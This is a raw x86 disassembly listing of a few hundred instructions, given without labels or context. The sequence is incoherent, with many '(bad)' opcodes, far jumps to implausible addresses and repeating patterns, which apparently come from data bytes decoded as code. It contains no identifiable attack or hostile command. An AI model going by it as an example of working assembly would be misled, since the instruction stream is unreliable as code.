  41d1f5:	bound  edx,QWORD PTR [ebp+0x45]
  41d1f8:	push   eax
  41d1f9:	pop    ecx
  41d1fa:	retf   
  41d1fb:	inc    eax
  41d1fc:	dec    esi
  41d1fd:	dec    eax
  41d1fe:	add    eax,0x4c88c03f
  41d203:	adc    eax,eax
  41d205:	xchg   cl,cl
  41d207:	inc    esp
  41d208:	jmp    0x2982c75d
  41d20d:	jp     0x41d19f
  41d20f:	dec    ebx
  41d210:	add    BYTE PTR [ebx-0x3f],ah
  41d213:	bound  eax,QWORD PTR [eax+0x25]
  41d216:	add    BYTE PTR [esi+0x40],ah
  41d219:	add    eax,0x40404143
  41d21e:	inc    ebx
  41d21f:	add    BYTE PTR [eax],al
  41d221:	add    BYTE PTR [edx-0x34],ah
  41d224:	inc    eax
  41d225:	add    eax,0x40004041
  41d22a:	inc    ecx
  41d22b:	int3   
  41d22c:	add    BYTE PTR [ebx-0x7c],al
  41d22f:	add    eax,0x5406240
  41d234:	bound  ecx,QWORD PTR [esi]
  41d236:	arpl   WORD PTR [ecx-0x41],di
  41d239:	sub    eax,0x404add76
  41d23e:	rol    BYTE PTR [edx],0x41
  41d241:	pop    ds
  41d242:	into   
  41d243:	inc    eax
  41d244:	aad    0x9
  41d246:	test   eax,0x620dde15
  41d24b:	cmp    BYTE PTR [eax+0x62],al
  41d24e:	pop    eax
  41d24f:	inc    ecx
  41d250:	add    eax,0x40404340
  41d255:	inc    ebx
  41d256:	inc    eax
  41d257:	test   BYTE PTR [eax],al
  41d259:	add    eax,0x40624041
  41d25e:	inc    eax
  41d25f:	add    BYTE PTR [edx+0x5],ah
  41d262:	inc    ebx
  41d263:	add    BYTE PTR [eax+0x78],al
  41d266:	inc    ecx
  41d267:	add    BYTE PTR [eax+0x41],bl
  41d26a:	bound  esi,QWORD PTR [eax]
  41d26c:	inc    eax
  41d26d:	push   esi
  41d26e:	and    al,0xa8
  41d270:	je     0x41d2df
  41d272:	sbb    eax,0xc3c01f54
  41d277:	bound  ecx,QWORD PTR [edx]
  41d279:	and    BYTE PTR [ecx+ecx*8+0x45823340],cl
  41d280:	bound  edi,QWORD PTR [edi+0x66]
  41d283:	es adc al,0xaa
  41d286:	ins    DWORD PTR es:[edi],dx
  41d287:	fmul   st,st(3)
  41d289:	push   eax
  41d28a:	push   eax
  41d28b:	mov    eax,0x2c001d40
  41d290:	(bad)  [ebx+0x6c]
  41d293:	inc    edx
  41d294:	adc    dl,al
  41d296:	sub    BYTE PTR [eax+0x1aebfa31],0x40
  41d29d:	test   eax,0xcc008440
  41d2a2:	bound  eax,QWORD PTR ds:0xcc840f41
  41d2a8:	inc    ebx
  41d2a9:	add    BYTE PTR [eax+0x0],al
  41d2ac:	inc    eax
  41d2ad:	inc    eax
  41d2ae:	inc    eax
  41d2af:	int3   
  41d2b0:	add    BYTE PTR ds:0x62404341,al
  41d2b6:	pop    eax
  41d2b7:	add    BYTE PTR [ebx+0x40],al
  41d2ba:	bound  ecx,QWORD PTR [edi]
  41d2bc:	inc    eax
  41d2bd:	and    al,0x12
  41d2bf:	push   eax
  41d2c0:	nop
  41d2c1:	nop
  41d2c2:	les    ebx,FWORD PTR [ecx]
  41d2c4:	ins    BYTE PTR es:[edi],dx
  41d2c5:	dec    esi
  41d2c6:	mov    ah,0xdc
  41d2c8:	bound  esp,QWORD PTR [edx+0x6b]
  41d2cb:	inc    eax
  41d2cc:	rol    BYTE PTR [edx],0x41
  41d2cf:	push   ebx
  41d2d0:	inc    ebp
  41d2d1:	mov    ah,0x41
  41d2d3:	adc    ch,BYTE PTR [ecx+0x40000022]
  41d2d9:	inc    eax
  41d2da:	cmovno eax,DWORD PTR ds:0x40056243
  41d2e1:	int3   
  41d2e2:	add    ah,cl
  41d2e4:	inc    eax
  41d2e5:	inc    eax
  41d2e6:	bound  eax,QWORD PTR [ecx+0x0]
  41d2e9:	add    BYTE PTR [edi],cl
  41d2eb:	inc    ebx
  41d2ec:	inc    eax
  41d2ed:	inc    eax
  41d2ee:	add    BYTE PTR [ecx+0x43],al
  41d2f1:	add    eax,0x40256240
  41d2f6:	bound  eax,QWORD PTR [eax]
  41d2f8:	pop    ss
  41d2f9:	mov    al,ds:0x40805524
  41d2fe:	inc    ebp
  41d2ff:	inc    edi
  41d300:	mov    BYTE PTR [esi+esi*1],dh
  41d303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d304:	ret    
  41d305:	add    eax,eax
  41d307:	and    BYTE PTR [edx-0x80],0xa8
  41d30b:	push   edx
  41d30c:	inc    ecx
  41d30d:	inc    eax
  41d30e:	test   eax,0x11c54b15
  41d313:	inc    ebp
  41d314:	inc    ecx
  41d315:	add    eax,0x54ec38db
  41d31a:	add    dl,BYTE PTR [ecx-0xc]
  41d31d:	inc    eax
  41d31e:	rol    ah,0x52
  41d321:	inc    ecx
  41d322:	dec    esp
  41d323:	mov    eax,DWORD PTR [si]
  41d326:	pusha  
  41d327:	add    BYTE PTR [ecx-0x2b],al
  41d32a:	int    0xad
  41d32c:	add    eax,0x4140cc00
  41d331:	inc    eax
  41d332:	inc    ebx
  41d333:	bound  esp,QWORD PTR ds:0x41400043
  41d339:	add    BYTE PTR [eax],al
  41d33b:	add    eax,0x43624062
  41d340:	inc    ecx
  41d341:	inc    eax
  41d342:	inc    eax
  41d343:	inc    eax
  41d344:	add    eax,0x40624340
  41d349:	add    eax,0x40664140
  41d34e:	test   al,0x40
  41d350:	jmp    0x1142:0x546cf273
  41d357:	inc    eax
  41d358:	add    eax,DWORD PTR [eax-0x3c]
  41d35b:	arpl   WORD PTR [ebp+eiz*8-0x50],ax
  41d35f:	inc    eax
  41d360:	shl    DWORD PTR [ecx+0x4f],0xad
  41d364:	repz push 0x4057140d
  41d36a:	inc    ecx
  41d36b:	into   
  41d36c:	push   eax
  41d36d:	mov    ah,0xcb
  41d36f:	inc    eax
  41d370:	sar    BYTE PTR [edx+0x1e],0xc9
  41d374:	pop    edx
  41d375:	inc    esi
  41d376:	inc    ebx
  41d377:	add    BYTE PTR ds:0x41107840,al
  41d37d:	bound  eax,QWORD PTR [eax+0x40]
  41d380:	sldt   WORD PTR [eax-0x34]
  41d384:	js     0x41d3e8
  41d386:	add    eax,0x40664143
  41d38b:	inc    ebx
  41d38c:	add    BYTE PTR [ecx+0x5],al
  41d38f:	js     0x41d3d1
  41d391:	bound  eax,QWORD PTR [eax+0x0]
  41d394:	inc    eax
  41d395:	mov    al,0x18
  41d397:	cmovl  edx,esp
  41d39a:	lock int 0x59
  41d39d:	retf   
  41d39e:	inc    eax
  41d39f:	pop    ebx
  41d3a0:	and    BYTE PTR [ebx+0x8],0x60
  41d3a4:	addr16 inc ebp
  41d3a6:	adc    al,0xc2
  41d3a8:	add    DWORD PTR [esi],ebp
  41d3aa:	(bad)  
  41d3ab:	fst    QWORD PTR [eax]
  41d3ad:	inc    ecx
  41d3ae:	inc    eax
  41d3af:	jg     0x41d3eb
  41d3b1:	inc    ecx
  41d3b2:	inc    ebx
  41d3b3:	inc    eax
  41d3b4:	inc    eax
  41d3b5:	add    eax,0x434162
  41d3ba:	inc    eax
  41d3bb:	add    BYTE PTR [edx+0x5],ah
  41d3be:	inc    eax
  41d3bf:	adc    BYTE PTR [edx+0x40],ah
  41d3c2:	inc    ebx
  41d3c3:	inc    ecx
  41d3c4:	add    eax,0x4340
  41d3c9:	add    eax,0x404162
  41d3ce:	add    BYTE PTR [eax+0x43],al
  41d3d1:	inc    eax
  41d3d2:	add    eax,0x84647bb8
  41d3d7:	fsubr  QWORD PTR [esi+0x45]
  41d3da:	inc    eax
  41d3db:	mov    esp,edi
  41d3dd:	sub    BYTE PTR [eax+0x32],bh
  41d3e0:	inc    eax
  41d3e1:	shr    BYTE PTR [ecx],0x4e
  41d3e4:	bound  edi,QWORD PTR [eax]
  41d3e6:	ss cdq 
  41d3e8:	push   cs
  41d3e9:	test   eax,0x5611214d
  41d3ee:	inc    esp
  41d3ef:	push   ebp
  41d3f0:	inc    eax
  41d3f1:	inc    eax
  41d3f2:	add    BYTE PTR [eax],dl
  41d3f4:	xchg   esp,eax
  41d3f5:	inc    ebx
  41d3f6:	stos   BYTE PTR es:[edi],al
  41d3f7:	ret    0x940f
  41d3fa:	ins    DWORD PTR es:[edi],dx
  41d3fb:	sub    BYTE PTR [edi+0x4000cfd4],bl
  41d401:	xor    eax,DWORD PTR [eax+0x0]
  41d404:	add    BYTE PTR [ecx+0x43],al
  41d407:	add    eax,0x41784062
  41d40c:	inc    eax
  41d40d:	inc    eax
  41d40e:	add    BYTE PTR [edi],cl
  41d410:	bound  eax,QWORD PTR [ebx+0x0]
  41d413:	add    eax,0x25006240
  41d418:	inc    eax
  41d419:	add    eax,0x40254143
  41d41e:	add    eax,0x5f620000
  41d423:	mul    BYTE PTR [esi]
  41d425:	mov    al,ds:0xf4093462
  41d42a:	add    edx,ecx
  41d42c:	add    eax,0x40436640
  41d431:	ret    
  41d432:	jp     0x41d499
  41d434:	retf   
  41d435:	xor    eax,0x3e14963c
  41d43a:	add    al,0x42
  41d43c:	aad    0x68
  41d43e:	arpl   WORD PTR [edx+0x40],dx
  41d441:	enter  0x347b,0x92
  41d445:	loopne 0x41d4b4
  41d447:	leave  
  41d448:	add    esi,DWORD PTR [ebx]
  41d44a:	push   esi
  41d44b:	(bad)  [eax+0x7d]
  41d44e:	cld    
  41d44f:	test   al,0x40
  41d451:	xor    eax,0xb5342240
  41d456:	adc    al,BYTE PTR fs:[ebx+0x0]
  41d45a:	add    BYTE PTR [eax],al
  41d45c:	inc    ecx
  41d45d:	inc    eax
  41d45e:	bound  esp,QWORD PTR [esi+0x0]
  41d461:	inc    eax
  41d462:	add    eax,0x5400000
  41d467:	inc    ecx
  41d468:	inc    eax
  41d469:	inc    eax
  41d46a:	bound  esp,QWORD PTR ds:0x25050043
  41d470:	inc    ecx
  41d471:	inc    ebx
  41d472:	inc    eax
  41d473:	test   BYTE PTR [eax+0x0],al
  41d476:	bound  ebx,QWORD PTR [eax+0x62]
  41d479:	inc    ecx
  41d47a:	inc    eax
  41d47b:	adc    eax,0x45e504c3
  41d480:	bound  edx,QWORD PTR [ebp-0x50]
  41d483:	inc    eax
  41d484:	inc    esp
  41d485:	jo     0x41d4e9
  41d487:	ss int 0xdc
  41d48a:	adc    eax,0x4240c012
  41d48f:	jbe    0x41d449
  41d491:	repnz int 0x40
  41d494:	and    eax,DWORD PTR [eax]
  41d496:	xor    al,0x34
  41d498:	stc    
  41d499:	cld    
  41d49a:	inc    esp
  41d49b:	adc    al,0x33
  41d49d:	js     0x41d473
  41d49f:	inc    ebp
  41d4a0:	adc    BYTE PTR [esi+0x67],ah
  41d4a3:	inc    eax
  41d4a4:	ret    0x2840
  41d4a7:	ss push eax
  41d4a9:	mov    edi,0x632d1308
  41d4ae:	push   esp
  41d4af:	add    esp,DWORD PTR [eax-0x44]
  41d4b2:	gs inc eax
  41d4b4:	cs inc eax
  41d4b6:	xchg   edx,eax
  41d4b7:	stos   DWORD PTR es:[edi],eax
  41d4b8:	xchg   esi,eax
  41d4b9:	adc    BYTE PTR [edx+0x40],ah
  41d4bc:	inc    ecx
  41d4bd:	and    eax,0x40000500
  41d4c2:	inc    ebx
  41d4c3:	add    eax,0x40624041
  41d4c8:	inc    ebx
  41d4c9:	add    eax,0x43402541
  41d4ce:	bound  eax,QWORD PTR [eax+0x43]
  41d4d1:	int3   
  41d4d2:	inc    eax
  41d4d3:	bound  eax,QWORD PTR [eax]
  41d4d5:	inc    ecx
  41d4d6:	inc    eax
  41d4d7:	inc    eax
  41d4d8:	add    eax,0xe494605
  41d4dd:	sub    DWORD PTR [edx+0x45],edi
  41d4e0:	jo     0x41d545
  41d4e2:	jo     0x41d4ac
  41d4e4:	inc    eax
  41d4e5:	ret    0x38e0
  41d4e8:	(bad)  
  41d4e9:	push   esp
  41d4ea:	imul   eax,DWORD PTR [edx+0x9],0x70f1732d
  41d4f1:	sbb    al,0xb4
  41d4f3:	add    al,0x40
  41d4f5:	pop    edx
  41d4f6:	sub    BYTE PTR [eax+0x69db213c],0x1f
  41d4fd:	bound  eax,QWORD PTR [eax+0x25]
  41d500:	add    BYTE PTR [esi+0x40],ah
  41d503:	add    eax,0x40404143
  41d508:	inc    ebx
  41d509:	add    BYTE PTR [eax],al
  41d50b:	add    BYTE PTR [edx-0x34],ah
  41d50e:	inc    eax
  41d50f:	add    eax,0x40004041
  41d514:	inc    ecx
  41d515:	int3   
  41d516:	add    BYTE PTR [ebx-0x7c],al
  41d519:	add    eax,0x5406240
  41d51e:	(bad)  
  41d51f:	shr    BYTE PTR [eax+edx*1],0x65
  41d523:	push   ebx
  41d524:	in     eax,dx
  41d525:	pusha  
  41d526:	inc    eax
  41d527:	add    eax,ebp
  41d529:	mov    ah,0x6d
  41d52b:	xchg   esp,eax
  41d52c:	ins    BYTE PTR es:[edi],dx
  41d52d:	mov    bh,0x14
  41d52f:	inc    ecx
  41d530:	add    DWORD PTR [ecx+0x38],eax
  41d533:	fcom   QWORD PTR [esp+edx*2+0x40]
  41d537:	lds    eax,FWORD PTR [ebp+0x54]
  41d53a:	and    BYTE PTR [edx-0x25],ah
  41d53d:	(bad)  
  41d53e:	adc    BYTE PTR ds:0x1c29d001,ch
  41d544:	in     eax,dx
  41d545:	push   eax
  41d546:	inc    eax
  41d547:	ret    0xd079
  41d54a:	test   al,0xfe
  41d54c:	arpl   WORD PTR [eax+0x19],ax
  41d54f:	outs   dx,BYTE PTR ds:[esi]
  41d550:	add    DWORD PTR [edx+0x12],0x40a911a8
  41d557:	bound  ebx,QWORD PTR [eax+0x41]
  41d55a:	add    eax,0x40404340
  41d55f:	inc    ebx
  41d560:	inc    eax
  41d561:	test   BYTE PTR [eax],al
  41d563:	add    eax,0x40624041
  41d568:	inc    eax
  41d569:	add    BYTE PTR [edx+0x5],ah
  41d56c:	inc    ebx
  41d56d:	add    BYTE PTR [eax+0x78],al
  41d570:	inc    ecx
  41d571:	add    BYTE PTR [eax+0x41],bl
  41d574:	bound  eax,QWORD PTR [eax+0x16]
  41d577:	pusha  
  41d578:	shl    DWORD PTR [eax+edx*1+0x126724],1
  41d57f:	sub    BYTE PTR [edx+eax*2-0x4c],0x63
  41d584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d585:	inc    eax
  41d586:	shl    DWORD PTR [ecx+ebx*2],0xf6
  41d58a:	inc    edx
  41d58b:	push   edi
  41d58c:	inc    edi
  41d58d:	inc    eax
  41d58e:	test   BYTE PTR [eax],al
  41d590:	int3   
  41d591:	bound  eax,QWORD PTR ds:0xcc840f41
  41d597:	inc    ebx
  41d598:	add    BYTE PTR [eax+0x0],al
  41d59b:	inc    eax
  41d59c:	inc    eax
  41d59d:	inc    eax
  41d59e:	int3   
  41d59f:	add    BYTE PTR ds:0x62404341,al
  41d5a5:	pop    eax
  41d5a6:	add    BYTE PTR [ebx+0x40],al
  41d5a9:	bound  ecx,QWORD PTR [edi]
  41d5ab:	inc    eax
  41d5ac:	add    ebp,DWORD PTR [esi+0x6a]
  41d5af:	fcom   DWORD PTR [ebp+ebp*1-0x3dbfd6bc]
  41d5b6:	add    DWORD PTR [ecx],esi
  41d5b8:	(bad)  
  41d5b9:	in     al,dx
  41d5ba:	add    DWORD PTR [edi+0x5],ebp
  41d5bd:	and    ebp,edi
  41d5bf:	pop    ds
  41d5c0:	or     eax,0x40306762
  41d5c5:	and    BYTE PTR [ecx+0x42],al
  41d5c8:	pop    ebp
  41d5c9:	or     ch,BYTE PTR [edi-0x36]
  41d5cc:	add    al,0xc1
  41d5ce:	add    dl,dl
  41d5d0:	cmp    eax,0x40c4a830
  41d5d5:	push   edi
  41d5d6:	and    ch,BYTE PTR [ebp-0x80]
  41d5d9:	xchg   ecx,eax
  41d5da:	adc    DWORD PTR [edi+0x40],ecx
  41d5dd:	rcl    DWORD PTR [eax-0x62],0x28
  41d5e1:	mov    eax,0x7f4048b8
  41d5e6:	add    BYTE PTR [eax],0x0
  41d5e9:	inc    eax
  41d5ea:	inc    eax
  41d5eb:	cmovno eax,DWORD PTR ds:0x40056243
  41d5f2:	int3   
  41d5f3:	add    ah,cl
  41d5f5:	inc    eax
  41d5f6:	inc    eax
  41d5f7:	bound  eax,QWORD PTR [ecx+0x0]
  41d5fa:	add    BYTE PTR [edi],cl
  41d5fc:	inc    ebx
  41d5fd:	inc    eax
  41d5fe:	inc    eax
  41d5ff:	add    BYTE PTR [ecx+0x43],al
  41d602:	add    eax,0x40256240
  41d607:	bound  eax,QWORD PTR [eax]
  41d609:	mov    al,ds:0xbb410d62
  41d60e:	and    al,0xc5
  41d610:	bound  ebp,QWORD PTR [eax+0x5be5cb35]
  41d616:	inc    eax
  41d617:	jbe    0x41d659
  41d619:	adc    DWORD PTR [eax+0x41],eax
  41d61c:	mov    ah,0xa8
  41d61e:	inc    eax
  41d61f:	lds    edi,FWORD PTR [ebp-0x4c]
  41d622:	xchg   esp,eax
  41d623:	sub    BYTE PTR [ebx+0x42],ah
  41d626:	inc    eax
  41d627:	push   0xc83d4240
  41d62c:	jg     0x41d658
  41d62e:	and    eax,ebx
  41d630:	xor    esp,DWORD PTR [ebx+eax*8]
  41d633:	push   ebx
  41d634:	add    eax,0x4140cc00
  41d639:	inc    eax
  41d63a:	inc    ebx
  41d63b:	bound  esp,QWORD PTR ds:0x41400043
  41d641:	add    BYTE PTR [eax],al
  41d643:	add    eax,0x43624062
  41d648:	inc    ecx
  41d649:	inc    eax
  41d64a:	inc    eax
  41d64b:	inc    eax
  41d64c:	add    eax,0x40624340
  41d651:	add    eax,0x40664140
  41d656:	cld    
  41d657:	adc    al,BYTE PTR [eax-0x61]
  41d65a:	loopne 0x41d644
  41d65c:	push   0x40b8624f
  41d661:	js     0x41d6dc
  41d663:	bound  esi,QWORD PTR ds:0x40150b00
  41d669:	leave  
  41d66a:	add    cl,BYTE PTR [edi+0x40]
  41d66d:	or     DWORD PTR [esp+eax*2+0x82ce922],edx
  41d674:	cwde   
  41d675:	bound  eax,QWORD PTR gs:[ecx+0x40]
  41d679:	inc    ecx
  41d67a:	and    edx,DWORD PTR [edx+0x43]
  41d67d:	add    BYTE PTR ds:0x41107840,al
  41d683:	bound  eax,QWORD PTR [eax+0x40]
  41d686:	sldt   WORD PTR [eax-0x34]
  41d68a:	js     0x41d6ee
  41d68c:	add    eax,0x40664143
  41d691:	inc    ebx
  41d692:	add    BYTE PTR [ecx+0x5],al
  41d695:	js     0x41d6d7
  41d697:	bound  eax,QWORD PTR [eax+0x0]
  41d69a:	inc    eax
  41d69b:	cmp    eax,0x4058645c
  41d6a0:	pop    ebp
  41d6a1:	add    BYTE PTR [edx-0x3d],0xdc
  41d6a5:	cwde   
  41d6a6:	addr16 inc eax
  41d6a8:	inc    ecx
  41d6a9:	ss jb  0x41d6dd
  41d6ac:	jmp    0x41d710
  41d6ae:	retf   
  41d6af:	and    DWORD PTR [edi],esp
  41d6b1:	cmp    ah,al
  41d6b3:	xor    eax,0x400b4811
  41d6b8:	inc    ecx
  41d6b9:	or     BYTE PTR [edi+0x4d],0xc4
  41d6bd:	sbb    ch,bh
  41d6bf:	inc    eax
  41d6c0:	test   eax,0x2666417c
  41d6c5:	inc    ecx
  41d6c6:	inc    ebx
  41d6c7:	inc    eax
  41d6c8:	inc    eax
  41d6c9:	add    eax,0x434162
  41d6ce:	inc    eax
  41d6cf:	add    BYTE PTR [edx+0x5],ah
  41d6d2:	inc    eax
  41d6d3:	adc    BYTE PTR [edx+0x40],ah
  41d6d6:	inc    ebx
  41d6d7:	inc    ecx
  41d6d8:	add    eax,0x4340
  41d6dd:	add    eax,0x404162
  41d6e2:	add    BYTE PTR [eax+0x43],al
  41d6e5:	inc    eax
  41d6e6:	add    eax,0x4140056c
  41d6eb:	adc    al,0xd5
  41d6ed:	cmp    BYTE PTR [ebx+0x4],ah
  41d6f0:	enter  0x6150,0x11
  41d6f4:	and    al,0x90
  41d6f6:	sbb    eax,0x404062a2
  41d6fb:	adc    ah,BYTE PTR [ebx+0x43]
  41d6fe:	in     al,dx
  41d6ff:	cmp    eax,0x52e4041
  41d704:	sbb    al,0xc5
  41d706:	push   edx
  41d707:	bound  ebx,QWORD PTR [eax+0x40]
  41d70a:	test   ebx,ebp
  41d70c:	test   al,al
  41d70e:	les    edi,FWORD PTR [eax+0xd41446a]
  41d714:	bound  eax,QWORD PTR [ebx+0x4f]
  41d717:	add    eax,0xbbd4002
  41d71c:	ins    DWORD PTR es:[edi],dx
  41d71d:	and    eax,0x40aa6bac
  41d722:	jg     0x41d76a
  41d724:	inc    eax
  41d725:	add    BYTE PTR [eax],al
  41d727:	inc    ecx
  41d728:	inc    ebx
  41d729:	add    eax,0x41784062
  41d72e:	inc    eax
  41d72f:	inc    eax
  41d730:	add    BYTE PTR [edi],cl
  41d732:	bound  eax,QWORD PTR [ebx+0x0]
  41d735:	add    eax,0x25006240
  41d73a:	inc    eax
  41d73b:	add    eax,0x40254143
  41d740:	add    eax,0xea620000
  41d745:	xor    eax,0x40354c15
  41d74a:	inc    edi
  41d74b:	add    BYTE PTR [eax+0x4105c968],ch
  41d751:	inc    ebx
  41d752:	mov    ebp,DWORD PTR [esi]
  41d754:	inc    eax
  41d755:	and    DWORD PTR [eax+0x424058cb],esp
  41d75b:	pop    edx
  41d75c:	inc    eax
  41d75d:	arpl   WORD PTR ds:0x2d40690f,dx
  41d763:	add    BYTE PTR [edx+0x1f],0x43
  41d767:	add    BYTE PTR [eax],al
  41d769:	add    BYTE PTR [ecx+0x40],al
  41d76c:	bound  esp,QWORD PTR [esi+0x0]
  41d76f:	inc    eax
  41d770:	add    eax,0x5400000
  41d775:	inc    ecx
  41d776:	inc    eax
  41d777:	inc    eax
  41d778:	bound  esp,QWORD PTR ds:0x25050043
  41d77e:	inc    ecx
  41d77f:	inc    ebx
  41d780:	inc    eax
  41d781:	test   BYTE PTR [eax+0x0],al
  41d784:	bound  ebx,QWORD PTR [eax+0x62]
  41d787:	inc    ecx
  41d788:	inc    eax
  41d789:	inc    ebx
  41d78a:	inc    esp
  41d78b:	jb     0x41d7cd
  41d78d:	movq   mm0,QWORD PTR [edi]
  41d790:	inc    eax
  41d791:	push   esp
  41d792:	push   ebx
  41d793:	pusha  
  41d794:	inc    edx
  41d795:	inc    edx
  41d796:	inc    eax
  41d797:	test   eax,0xd1284662
  41d79c:	inc    eax
  41d79d:	xor    edi,DWORD PTR [esp+eiz*4+0x10]
  41d7a1:	bound  eax,QWORD PTR [eax+0x41]
  41d7a4:	and    eax,0x40000500
  41d7a9:	inc    ebx
  41d7aa:	add    eax,0x40624041
  41d7af:	inc    ebx
  41d7b0:	add    eax,0x43402541
  41d7b5:	bound  eax,QWORD PTR [eax+0x43]
  41d7b8:	int3   
  41d7b9:	inc    eax
  41d7ba:	bound  eax,QWORD PTR [eax]
  41d7bc:	inc    ecx
  41d7bd:	inc    eax
  41d7be:	inc    eax
  41d7bf:	add    eax,0xa13cbc05
  41d7c4:	bound  eax,QWORD PTR [eax+0x4f]
  41d7c7:	or     al,0x5
  41d7c9:	arpl   WORD PTR [eax+edx*8-0x74bbbfb8],sp
  41d7d0:	retf   
  41d7d1:	jno    0x41d835
  41d7d3:	xlat   BYTE PTR ds:[ebx]
  41d7d4:	clc    
  41d7d5:	inc    ecx
  41d7d6:	sub    dl,BYTE PTR [ecx+0x25406248]
  41d7dc:	add    BYTE PTR [esi+0x40],ah
  41d7df:	add    eax,0x40404143
  41d7e4:	inc    ebx
  41d7e5:	add    BYTE PTR [eax],al
  41d7e7:	add    BYTE PTR [edx-0x34],ah
  41d7ea:	inc    eax
  41d7eb:	add    eax,0x40004041
  41d7f0:	inc    ecx
  41d7f1:	int3   
  41d7f2:	add    BYTE PTR [ebx-0x7c],al
  41d7f5:	add    eax,0x5406240
  41d7fa:	bound  esp,QWORD PTR [edx+0x6a]
  41d7fd:	sti    
  41d7fe:	push   edx
  41d7ff:	inc    eax
  41d800:	dec    ecx
  41d801:	arpl   WORD PTR [ecx-0x6f],cx
  41d804:	sub    BYTE PTR [ecx+0x14240c8],bh
  41d80a:	and    al,0xcc
  41d80c:	push   esi
  41d80d:	push   0x4d954022
  41d812:	mov    esp,0x55bcb4dd
  41d817:	inc    ecx
  41d818:	xor    al,0x40
  41d81a:	bound  ebx,QWORD PTR [eax+0x41]
  41d81d:	add    eax,0x40404340
  41d822:	inc    ebx
  41d823:	inc    eax
  41d824:	test   BYTE PTR [eax],al
  41d826:	add    eax,0x40624041
  41d82b:	inc    eax
  41d82c:	add    BYTE PTR [edx+0x5],ah
  41d82f:	inc    ebx
  41d830:	add    BYTE PTR [eax+0x78],al
  41d833:	inc    ecx
  41d834:	add    BYTE PTR [eax+0x41],bl
  41d837:	bound  eax,QWORD PTR [eax]
  41d839:	fs enter 0x554,0x39
  41d83e:	inc    eax
  41d83f:	out    0x38,eax
  41d841:	pop    eax
  41d842:	inc    esp
  41d843:	sar    bh,cl
  41d845:	mov    eax,0xdc404140
  41d84a:	and    eax,0x40e0e2a8
  41d84f:	imul   esp,DWORD PTR ds:0x4711cfd0,0xcc008440
  41d859:	bound  eax,QWORD PTR ds:0xcc840f41
  41d85f:	inc    ebx
  41d860:	add    BYTE PTR [eax+0x0],al
  41d863:	inc    eax
  41d864:	inc    eax
  41d865:	inc    eax
  41d866:	int3   
  41d867:	add    BYTE PTR ds:0x62404341,al
  41d86d:	pop    eax
  41d86e:	add    BYTE PTR [ebx+0x40],al
  41d871:	bound  ecx,QWORD PTR [edi]
  41d873:	inc    eax
  41d874:	push   ebp
  41d875:	inc    ebx
  41d876:	inc    edx
  41d877:	bound  ebx,QWORD PTR [edi+edi*2+0x10]
  41d87b:	lock bound eax,QWORD PTR [eax+0x30]
  41d87f:	mov    esp,DWORD PTR [ebp+0x11]
  41d882:	inc    ecx
  41d883:	addr16 inc esp
  41d885:	inc    eax
  41d886:	pop    edi
  41d887:	jne    0x41d8ed
  41d889:	bound  edi,QWORD PTR [eax+0x44406838]
  41d88f:	add    DWORD PTR [ebx-0x35],ebp
  41d892:	lock stos DWORD PTR es:[edi],eax
  41d894:	add    DWORD PTR [eax+0x24],eax
  41d897:	adc    al,0xdd
  41d899:	pop    es
  41d89a:	push   edx
  41d89b:	mov    ah,0x63
  41d89d:	xor    BYTE PTR [ecx],bl
  41d89f:	lds    esi,FWORD PTR [edx]
  41d8a1:	xor    ebx,ecx
  41d8a3:	add    eax,0x40000092
  41d8a8:	inc    eax
  41d8a9:	cmovno eax,DWORD PTR ds:0x40056243
  41d8b0:	int3   
  41d8b1:	add    ah,cl
  41d8b3:	inc    eax
  41d8b4:	inc    eax
  41d8b5:	bound  eax,QWORD PTR [ecx+0x0]
  41d8b8:	add    BYTE PTR [edi],cl
  41d8ba:	inc    ebx
  41d8bb:	inc    eax
  41d8bc:	inc    eax
  41d8bd:	add    BYTE PTR [ecx+0x43],al
  41d8c0:	add    eax,0x40256240
  41d8c5:	bound  eax,QWORD PTR [eax]
  41d8c7:	jmp    0xcbb0:0xe9a48742
  41d8ce:	test   al,0x74
  41d8d0:	xor    BYTE PTR [edx+0x66],ah
  41d8d3:	push   eax
  41d8d4:	adc    eax,0x2afd6345
  41d8d9:	ret    0x6280
  41d8dc:	gs inc ebx
  41d8de:	test   DWORD PTR ss:[ecx+0x35],0x432f4473
  41d8e6:	(bad)  
  41d8e7:	retf   0x5e40
  41d8ea:	inc    edx
  41d8eb:	fadd   DWORD PTR [ebp+0x3a80ed3c]
  41d8f1:	sar    BYTE PTR [ecx+0x4d],0x69
  41d8f5:	jne    0x41d8df
  41d8f7:	dec    ecx
  41d8f8:	lds    esp,FWORD PTR [ebx]
  41d8fa:	out    0x45,eax
  41d8fc:	add    eax,0x4140cc00
  41d901:	inc    eax
  41d902:	inc    ebx
  41d903:	bound  esp,QWORD PTR ds:0x41400043
  41d909:	add    BYTE PTR [eax],al
  41d90b:	add    eax,0x43624062
  41d910:	inc    ecx
  41d911:	inc    eax
  41d912:	inc    eax
  41d913:	inc    eax
  41d914:	add    eax,0x40624340
  41d919:	add    eax,0x40664140
  41d91e:	fst    QWORD PTR [eax+0x62]
  41d921:	jno    0x41d966
  41d923:	retf   0xd55d
  41d926:	and    eax,0x29ec6bdc
  41d92b:	shl    DWORD PTR [eax+0x68],0xd0
  41d92f:	pop    ebx
  41d930:	sub    al,0x5
  41d932:	inc    ebx
  41d933:	in     eax,dx
  41d934:	push   ebx
  41d935:	inc    esp
  41d936:	dec    esp
  41d937:	inc    ebx
  41d938:	add    BYTE PTR ds:0x41107840,al
  41d93e:	bound  eax,QWORD PTR [eax+0x40]
  41d941:	sldt   WORD PTR [eax-0x34]
  41d945:	js     0x41d9a9
  41d947:	add    eax,0x40664143
  41d94c:	inc    ebx
  41d94d:	add    BYTE PTR [ecx+0x5],al
  41d950:	js     0x41d992
  41d952:	bound  eax,QWORD PTR [eax+0x0]
  41d955:	inc    eax
  41d956:	mov    esp,0xc9214941
  41d95b:	push   eax
  41d95c:	cmp    BYTE PTR [ebp+0x54],al
  41d95f:	mov    esp,0x406143c7
  41d964:	icebp  
  41d965:	jge    0x41d8ff
  41d967:	popa   
  41d968:	add    cl,BYTE PTR [edi]
  41d96a:	rcl    DWORD PTR [ecx],0x6c
  41d96d:	inc    esp
  41d96e:	imul   ecx,ecx,0xffffffbe
  41d971:	inc    edx
  41d972:	inc    esi
  41d973:	imul   edx,ebp,0x60
  41d976:	sbb    dh,BYTE PTR [ebp+0x41]
  41d979:	rol    BYTE PTR ss:[ecx],0x10
  41d97d:	imul   ebp,DWORD PTR [edx+ebx*8+0x40],0x40434155
  41d985:	inc    eax
  41d986:	add    eax,0x434162
